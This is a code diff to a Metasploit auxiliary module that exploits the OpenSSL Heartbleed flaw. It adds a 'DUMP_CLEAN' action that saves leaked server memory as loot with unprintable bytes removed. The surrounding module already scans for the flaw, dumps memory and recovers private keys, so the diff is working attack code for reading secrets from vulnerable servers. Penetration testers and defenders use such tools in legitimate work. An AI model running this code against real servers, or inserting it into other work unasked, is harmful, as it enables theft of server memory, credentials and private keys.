@@ -131,6 +131,7 @@ class Metasploit3 < Msf::Auxiliary
         [
           ['SCAN',  {'Description' => 'Check hosts for vulnerability'}],
           ['DUMP',  {'Description' => 'Dump memory contents'}],
+          ['DUMP_CLEAN', {'Description' => 'Dump readable memory contents'}],
           ['KEYS',  {'Description' => 'Recover private keys from memory'}]
         ],
       'DefaultAction' => 'SCAN'
@@ -309,6 +310,8 @@ class Metasploit3 < Msf::Auxiliary
       loot_and_report(bleed)
     when 'DUMP'
       loot_and_report(bleed)  # Scan & Dump are similar, scan() records results
+    when 'DUMP_CLEAN'
+      loot_and_report(bleed)
     when 'KEYS'
       getkeys()
     else
@@ -387,6 +390,22 @@ class Metasploit3 < Msf::Auxiliary
         match_data = heartbeat_data.scan(pattern).join
       else
         match_data = heartbeat_data
+      end
+      path = store_loot(
+        "openssl.heartbleed.server",
+        "application/octet-stream",
+        rhost,
+        match_data,
+        nil,
+        "OpenSSL Heartbleed server memory"
+      )
+      print_status("#{peer} - Heartbeat data stored in #{path}")
+    elsif action.name == 'DUMP_CLEAN'
+      pattern = datastore['DUMPFILTER']
+      if pattern
+        match_data = heartbeat_data.scan(pattern).join.gsub(/[^[:print:]]/, '')
+      else
+        match_data = heartbeat_data.gsub(/[^[:print:]]/, '')
       end
       path = store_loot(
         "openssl.heartbleed.server",
